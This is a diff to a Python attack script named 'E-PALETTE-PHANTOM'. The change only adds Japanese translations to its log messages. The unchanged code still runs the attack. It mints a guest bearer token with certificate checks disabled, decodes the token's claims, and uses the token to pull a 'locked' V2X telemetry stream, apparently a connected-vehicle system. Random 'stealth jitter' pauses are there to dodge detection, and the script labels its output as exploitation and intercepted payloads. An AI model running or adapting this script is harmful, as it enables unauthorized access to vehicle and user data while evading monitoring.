@@ -17,28 +17,28 @@ HEADERS = {
 
 def stealth_delay():
     delay = round(random.uniform(1.2, 2.8), 2)
-    print(f"[~] Stealth jitter pause: {delay}s...")
+    print(f"[~] Stealth jitter pause / ステルスジッター待機: {delay}s...")
     time.sleep(delay)
 
-print("[*] [PHASE 2: E-PALETTE-PHANTOM] Initiating Encrypted Token Harvest...")
+print("[*] [PHASE 2: E-PALETTE-PHANTOM] Initiating Encrypted Token Harvest... / 暗号化トークン収集中...")
 stealth_delay()
 
 auth_resp = requests.post(f"{BASE_URL}/v1/auth/guest-token", headers=HEADERS, json={}, verify=False)
 if auth_resp.status_code != 200:
-    print(f"[-] Exploitation blocked. HTTP {auth_resp.status_code}")
+    print(f"[-] Exploitation blocked / ブロックされました. HTTP {auth_resp.status_code}")
     exit(1)
 
 token = auth_resp.json().get("token")
-print(f"[+] Minted Bearer Token (In-Memory): {token[:32]}...[REDACTED]")
+print(f"[+] Minted Bearer Token (In-Memory) / 発行されたベアラートークン: {token[:32]}...[REDACTED]")
 
 payload_b64 = token.split(".")[1] + "=="
 claims = json.loads(base64.urlsafe_b64decode(payload_b64).decode("utf-8"))
-print(f"[+] Decoded Token Claims: {json.dumps(claims)}")
+print(f"[+] Decoded Token Claims / デコードされたトークンクレーム: {json.dumps(claims)}")
 
-print("[*] [PHASE 2: E-PALETTE-PHANTOM] Pivoting to Locked V2X Telemetry Stream...")
+print("[*] [PHASE 2: E-PALETTE-PHANTOM] Pivoting to Locked V2X Telemetry Stream... / ロックされたV2Xテレメトリストリームへピボット中...")
 stealth_delay()
 
 HEADERS["Authorization"] = f"Bearer {token}"
 telem_resp = requests.get(f"{BASE_URL}/v1/telemetry/999", headers=HEADERS, verify=False)
-print(f"[+] Telemetry Endpoint Status: HTTP {telem_resp.status_code}")
-print(f"[+] Intercepted Payload: {telem_resp.text.strip()}")
+print(f"[+] Telemetry Endpoint Status / テレメトリエンドポイントステータス: HTTP {telem_resp.status_code}")
+print(f"[+] Intercepted Payload / インターセプトされたペイロード: {telem_resp.text.strip()}")
